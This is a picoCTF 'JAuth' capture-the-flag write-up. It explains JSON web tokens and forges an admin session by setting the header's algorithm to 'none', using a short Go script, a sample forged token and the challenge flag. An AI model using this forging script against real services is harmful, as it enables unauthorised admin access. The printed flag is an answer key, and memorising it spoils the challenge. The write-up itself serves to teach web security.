---
title: "JAuth"
tags:
- Authentication Bypass
- CTF
- JWT
- PicoCTF
- Web
date: 2022-02-22T14:49:34+05:30
draft: false
---

The challenge description states that most web application developers use third party components without testing their security.
It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at http://saturn.picoctf.net:52025/

The goal is to become an `admin`.
We are provied with the username `test` and the password `Test123!` to look around.

The challenge is a dummy bank portal. On login, we see the message:
> Hello, You have logged in the testing page. There is nothing to see here.

While logging in, if we check the network requests and responses,
we can see a cookie named `token` being set.

```none
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw; path=/; httponly
```

On taking a closer look, the cookie looks like a [JSON web token](https://en.wikipedia.org/wiki/JSON_Web_Token).
JSON web tokens comprise three base64 encoded parts, each separated by a `.`
These include:
- Header
- Payload
- Verification signature

> We can make this educated guess since the value begins with `eyJ` which partially decodes to `{"`

For this token, we can base64 decode the header and the payload like so:

### Header

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`

decodes to

`{"typ":"JWT","alg":"HS256"}`

### Payload

`eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9`

decodes to

`{"auth":1645518293119,"agent":"Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0","role":"user","iat":1645518293}`

Decoding the signature would result in non-printable characters since it is the base64 representation of the HS256
or [HMAC](https://en.wikipedia.org/wiki/HMAC) [SHA256](https://en.wikipedia.org/wiki/SHA-2) digest of the header,
payload and a 256 bit secret.
Other algorithms include RSA256 (RSA SHA256), ES256 (ECDSA SHA256) and the like.

For forging an admin's cookie, we would need to modify the `"role"` field in the payload to `"admin"`.
However, if we do so, the verification signature becomes invalid for the payload. The only way we can
generate a valid signature is by knowing the 256 bit secret.

If we pay close attention to the header, we see that the verification algorithm is specified in the cookie.
We can modify the `"alg"` field of the header to `"none"` and omit the verification signature completely.
The trailing dot following the encoded payload must be present.

So, I wrote a little Golang program to do just that.

```go
package main

import (
 "encoding/base64"
 "encoding/json"
 "fmt"
 "log"
 "os"
 "strings"
)

// modify decodes a base64 encoded part of the token,
// and sets the `whence` field to the value supplied as `what`
func modify(part, whence, what string) (string, error) {
 // b has the base64 decoded bytes
 b, err := base64.URLEncoding.DecodeString(part)
 if err != nil {
  return "", err
 }
 // unmarshal the json data to the structure `p`
 p := make(map[string]interface{})
 err = json.Unmarshal(b, &p)
 if err != nil {
  return "", err
 }
 // set the `whence` field to `what`
 p[whence] = what
 // marshal the modified structure back to json
 marshalled, err := json.Marshal(p)
 if err != nil {
  return "", err
 }
 // return the modified part, encoded with base64
 return strings.Replace(base64.URLEncoding.EncodeToString(marshalled), "=", "", -1), nil
}

func main() {
 // print usage if token is not supplied
 if len(os.Args) < 2 {
  fmt.Fprintf(os.Stderr, "Usage:\n\t%s <token>\n", os.Args[0])
  os.Exit(1)
 }
 // split the parts
 parts := strings.Split(os.Args[1], ".")
 // set the last part to empty since we would not need it
 parts[2] = ""

 part, err := modify(parts[0], "alg", "none")
 if err != nil {
  log.Fatalln(err)
 }
 parts[0] = part
 part, err = modify(parts[1], "role", "admin")
 if err != nil {
  log.Fatalln(err)
 }
 parts[1] = part
 // join the parts back
 fmt.Printf("Forged token: %v\n", strings.Join(parts, "."))
}
```

Now we run:

```bash
go run main.go eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw
```

which gives forged token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwiYXV0aCI6MTY0NTUxODI5MzExOSwiaWF0IjoxNjQ1NTE4MjkzLCJyb2xlIjoiYWRtaW4ifQ.`

Manually setting the cookie to this value, we are redirected to the admin page.

> Hello, admin! You have logged in as admin!

and we are greeted with the flag `picoCTF{succ3ss_@u7h3nt1c@710n_57072644}`
